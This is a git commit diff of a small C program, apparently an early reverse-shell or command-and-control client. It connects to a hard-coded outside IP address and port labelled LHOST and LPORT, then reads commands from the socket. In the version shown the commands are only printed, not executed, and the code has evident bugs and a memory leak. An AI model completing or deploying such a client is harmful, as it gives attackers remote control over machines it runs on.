6d53623127ab9b8758f9357c56088e2939903bcd
54u63 <antoine.boury1@gmail.com>
2025-08-12 13:10:18 +0200

    going to lunch

--- main.c
+++ main.c
@@ -4,10 +4,58 @@
 #include <unistd.h>
 #include <arpa/inet.h>
 #include <errno.h>
-
+#include <string.h>
 
 #define LPORT 4190
 #define LHOST "212.227.28.186"
+#define BUFFLEN 1024
+
+int checkEnd(char* buffer, size_t size){
+  if (size<1){
+    return 1;
+  }
+
+  if (buffer[size-1]=='\n'){
+    return 0;
+  }
+  return 1;
+
+
+
+}
+
+int iterationLoop(int sockfd){
+  char* cmd = (char*)malloc(BUFFLEN); //buffer storing the entire command line
+  char* chunk = (char*)malloc(BUFFLEN); //buffer storing the chunk
+  int end = 0; //Value stoping the iteration loop 
+  int out = 0;
+  int bRead = 0;
+  size_t cmdLen = 0; //size of the effective element in the "cmd" Buffer
+  
+  while(!end){
+    bRead = read(sockfd,chunk,BUFFLEN);
+    if(bRead == 0){
+      perror("Nothing was recieved\n");
+      out+=1;
+      goto _GracefullEnd;
+    }
+    if(strcmp(chunk,"STOP\n")==0){
+      end+=1;
+    }
+    memcpy(cmd,chunk,bRead);
+    while(checkEnd(chunk,bRead)){
+      printf("wee need to fill the buffer\n");
+      break;
+    }
+    printf("%s <- cmd\n",cmd);
+    memset(cmd,'\0',BUFFLEN);
+  }
+  printf("Client has been Gracefully ShutDown\n");
+
+_GracefullEnd:
+  free(chunk);
+  return out;
+}
 
 
 int main(){
@@ -15,7 +63,6 @@ int main(){
   int sockfd, connfd = 0;
   struct sockaddr_in addr = {0};
   socklen_t addrlen = sizeof(addr);
-  char* command = malloc(1024);
 
   if ((sockfd = socket(AF_INET,SOCK_STREAM,0))<0){
     perror("failed to create socket");
@@ -37,8 +84,9 @@ int main(){
 
   printf("[+] Connected [+]\n");
 
+  iterationLoop(sockfd);
+
   close(sockfd);
-  free(command);
   return 0;
 
 }
